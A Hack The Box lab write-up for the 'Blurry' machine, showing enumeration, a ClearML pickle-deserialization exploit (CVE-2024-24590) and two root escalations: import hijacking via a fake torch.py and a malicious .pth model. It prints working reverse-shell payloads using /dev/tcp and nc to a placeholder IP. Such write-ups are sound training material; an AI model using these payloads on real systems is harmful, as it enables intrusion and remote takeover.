---
date: 2024-10-10T19:31:38-05:00
# description: ""
image: "/images/HTB-Blurry/Blurry.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Blurry"
type: "post"
---

* Platform: Hack The Box
* Link: [Blurry](https://app.hackthebox.com/machines/Blurry)
* Level: Medium
* OS: Linux
---

[Read this write up in french](https://scorpiosec.com/fr/posts/htb-blurry/)

The Blurry machine demonstrates how Python modules and specific Python features can be exploited to compromise systems. The challenge begins with access to a ClearML instance, containing various experiments tied to a project. Using `CVE-2024-24590`, we gain our initial foothold by uploading a malicious artifact through the API, allowing us to retrieve the user flag. This write-up will detail two distinct methods for privilege escalation, showcasing different approaches to fully compromise the system.

Target IP Address - `10.10.11.19`


## Scanning

```
./nmap_scan.sh 10.10.11.19 Blurry
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 19:38 CDT
Nmap scan report for 10.10.11.19
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
```

Our nmap scan discovers two open ports 22 (SSH) and 80 (HTTP). We also notice a redirection to `app.blurry.htb`, which we will access after updating our hosts file.

```
sudo echo "10.10.11.19 blurry.htb app.blurry.htb" | sudo tee -a /etc/hosts
```

## Enumeration 

At `http://app.blurry.htb/` we find a ClearML instance which we can connect to with the user name `Chad Jippity`. On the Github page we read that this solution is a "ML/DL development and production suite...". _[Source](https://github.com/allegroai/clearml)_

![ClearML website](/images/HTB-Blurry/ClearML_website.png)

There is nothing out of the ordinary on the website. Through subdomain enumeration we get two more results `files`, and `chat`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blurry.htb -H "Host: FUZZ.blurry.htb" -ic -fs 169
```

![Blurry subdomain enumeration](/images/HTB-Blurry/blurry_ffuf.png)

Since this is an orchestration and automation platform, it is safe to assume that there is some code running here. Upon entering the `Black Swan` project, we find different tasks or jobs under `Experiments`.

![Blurry Experiments section](/images/HTB-Blurry/blurry_experiments.png)


Right-clicking on one of the jobs and selecting `Details` shows that there is a script powering the tasks (`review_tasks.py`) in the picture below.

![Blurry Experiments details](/images/HTB-Blurry/experiment_details.png)

Through some research we discover various vulnerabilities related to ClearML, they are detailed [here](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/). 

Under the article section `Manipulating the Platform to Work for us` we get some code to exploit ClearML with `CVE-2024-24590`. We need to create a malicious artifact and then upload it to the instance for a project under our control.

![Malicious artifact](/images/HTB-Blurry/malicious_artifact.png)

![Malicious artifact upload](/images/HTB-Blurry/malicious_artifact_upload.png)

## Initial Foothold

First we need to connect our local machine to the ClearML server. Under the `Black Swan` project click on `New experiment`.

![ClearML new experiment](/images/HTB-Blurry/clearml_new_experiment.png)

There is a guide on how to set it up. Complete the configuration as prompted.

1. Install the `clearml` python package

```
pip install clearml
```

2. Run the command below

```
clearml-init
```

3. When prompted with `Paste copied configuration here:` use the code you generated after clicking on `CREATE NEW CREDENTIALS`. You need to add `api.blurry.htb` to your hosts file or the configuration will fail.

![ClearML configuartion steps](/images/HTB-Blurry/clearml_config_steps.png)

If everything goes right you will be notifiied as such.

![ClearML successful configuration](/images/HTB-Blurry/ClearML_success_config.png)

4. We can now upload a malicious artifact in order to get a reverse shell, after running the script below we get a shell on our listener as `jippity` and find the user flag in `/home/jippity`.

```python
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1"',))

command = RunCommand()

from clearml import Task
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
```

![Blurry user flag](/images/HTB-Blurry/blurry_user_flag.png)

## Privilege Escalation

With `sudo -l` we learn that the user `jippity` has the permission to run the `evaluate_model` command on any `.pth` file in the `/models` directory as root without providing a password.

![Blurry sudo -l](/images/HTB-Blurry/sudo-l_cmd.png)

### Python Import hijacking

In `/models` we find two files `demo_model.pth`, and `evaluate_model.py`. The script uses `import sys` which "provides various functions and variables that are used to manipulate different parts of the Python runtime environment.". _[Source](https://www.geeksforgeeks.org/python-sys-module/)_

Since there is no specifications related to the module we might be able to do some python import hijacking.

![evaluate_model script import functions](/images/HTB-Blurry/evaluate_model_script.png)


First we create a malicious `torch.py` script.

```
echo 'import os; os.system("bash")' > /models/torch.py
```

![Malicious torch.py](/images/HTB-Blurry/malicious_torch_py.png)


We then run `evaluate_model` with sudo.

```
sudo /usr/bin/evaluate_model /models/demo_model.pth
```

A root shell is spawned, allowing us to read the root flag located in `/root`.

![blurry root flag](/images/HTB-Blurry/blurry_root_flag.png)

#### Why is this working?

When a Python script imports a module (such as `torch`), Python searches for the module in various locations, starting with the current directory (which is `/models` in our case). Since we created a file called `torch.py` in the `/models` directory, Python imports our malicious `torch.py` instead of the actual torch library.

After the import, our file is executed and because the script (`evaluate_model.py`) is run as sudo we gain a root shell.



### Pickle deserialization

We can also exploit the target via pickle deserialization. Let's use a python script to generate a malicious model file.

```python
import torch
import torch.nn as nn
import torch.nn.functional as F
import os


class CustomModel(nn.Module):
    def __init__(self):
        super(CustomModel, self).__init__()
        self.linear = nn.Linear(512, 1)

    def forward(self, x):
        return self.linear(x)
    def __reduce__(self):
        return (os.system, ('echo Going for $USER on $HOSTNAME at $(date);rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f',))

model = CustomModel()

torch.save(model, 'root.pth')
```

After running the script (`root.py`) we have a file called `root.pth`.

![malicious model file](/images/HTB-Blurry/malicious_model_file.png)

Executing `sudo /usr/bin/evaluate_model /models/root.pth` grants us a root shell on the listener.

![root shell](/images/HTB-Blurry/root_shell.png)

#### Why is this working?

We are able to take advantage of the inherent insecurity of the `pickle` module. When `torch.save` is used to save a model in a `.pth` file, it relies on the `pickle` module to serialize the object, and the `__reduce__` method (where we place our malicious command)) dictactes what happens during that process.

![pickle module](/images/HTB-Blurry/pickle_module.png)
_[Source](https://docs.python.org/3/library/pickle.html)_


In the `CustomModel` class, the `__reduce__` method defines how the object is serialized when saved and how it will be deserialized when loaded. This method also contains our reverse shell command. When `torch.save(model, 'root.pth')` is called, the model is serialized, and during this process, our `__reduce__` method tells pickle to store a command that will be executed when the model is deserialized.

When we run sudo `/usr/bin/evaluate_model /models/root.pth`, the `evaluate_model.py` script attempts to load the model using `torch.load`. This deserializes the model and triggers the `__reduce__` method in our `CustomModel` class, which causes Python to execute the malicious command (in this case, the reverse shell).


I thoroughly enjoyed researching about those exploitation paths, and I was able to learn a lot. Thank you for reading this write up and I hope it was useful to you!
